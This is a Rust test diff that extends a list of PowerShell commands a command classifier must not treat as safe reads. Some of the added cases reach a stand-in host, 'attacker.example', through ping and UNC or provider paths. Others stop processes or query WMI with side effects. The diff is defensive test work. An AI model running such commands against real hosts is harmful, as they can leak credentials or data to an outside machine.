@@ -186,6 +186,20 @@ fn unread_scripts() -> Vec<String> {
         "Get-CimInstance -ClassName Win32_Process -ComputerName other".into(),
         "Get-Process -ComputerName other".into(),
         "Get-ChildItem -Path C:\\ -Credential user".into(),
+        // #2709 review r5: other computers (ping, WMI paths, network paths,
+        // also through a variable, an array or a provider qualifier), WMI
+        // classes with side effects, and cmdlets that wait for a key or prompt.
+        "Test-Connection attacker.example".into(),
+        r"Get-WmiObject -Path '\\h\root\cimv2:Win32_OperatingSystem=@'".into(),
+        "Get-CimInstance Win32_Product".into(),
+        r"Get-Content \\attacker.example\s\x".into(),
+        r"Get-Content -Path://attacker.example/s/x".into(),
+        r"Get-Content FileSystem::\\attacker.example\s\x".into(),
+        r"$p = '\\attacker.example\s\x'; Get-Content $p".into(),
+        r"Get-Content README.md, \\attacker.example\s\x".into(),
+        r"Set-Location \\attacker.example\s; Get-ChildItem".into(),
+        "Out-Host -Paging -InputObject x".into(),
+        "Stop-Process -Name x".into(),
         // #2709 review r2: a source named `.` (`s\.git\.` is `s\.git`), a copy
         // of a folder's contents, a download into a folder the server names.
         r"Copy-Item -Path s\.git\. -Destination . -Recurse -Force".into(),
@@ -271,6 +285,8 @@ async fn allowlisted_forms_stay_precise() {
             // File-system dynamic parameters, also for a path that does not exist.
             r"Get-ChildItem 'C:\does not\exist' -Directory -ea 0 | Select-Object -ExpandProperty Name",
             r"Get-Content -LiteralPath 'C:\does not\exist.txt' -Raw",
+            // A local device path is not a network path.
+            r"Get-Content -LiteralPath '\\?\C:\does not\exist.txt' -Raw",
         ] {
             for permission_profile in [
                 PermissionProfile::Disabled,
